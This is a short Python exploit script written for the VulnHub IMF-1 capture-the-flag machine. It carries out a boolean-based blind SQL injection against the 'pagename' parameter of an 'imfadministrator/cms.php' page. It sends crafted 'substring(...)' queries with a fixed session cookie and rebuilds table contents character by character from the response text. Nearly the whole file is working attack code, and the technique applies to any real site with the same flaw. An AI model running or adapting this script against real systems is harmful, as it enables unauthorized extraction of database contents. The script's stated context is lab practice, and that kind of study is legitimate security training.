#!/usr/bin/python3
# https://www.vulnhub.com/entry/imf-1,162/

import requests, sys, time, signal, string

def def_handler(sig, frame):
    print("\n[!] Exiting...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

URL = "http://192.168.100.215/imfadministrator/cms.php?pagename=home%27%20or%20substring(database(),1,1)=%27a"
chars = string.ascii_letters+string.digits+"-"+","+":"+"_"
cookies = {"PHPSESSID": "18jsn1dj2efhvfs0kdh5fffj31"}

def main():
    result = ""
    i = 0
    while True:
        i += 1 
        for char in chars:
            URL = "http://192.168.100.215/imfadministrator/cms.php?pagename=home' or substring((select group_concat(id,0x3a,pagename) from pages),%d,1)='%s" % (i, char)
            
            r = requests.post(URL, cookies=cookies)
            if "Under Construction." in r.text:
                result += char
                char = "" # Reset if found
                break
        if char: # Recursive exit. If nothing found, exit
            break

        print(result)

if __name__ == '__main__':
    main()
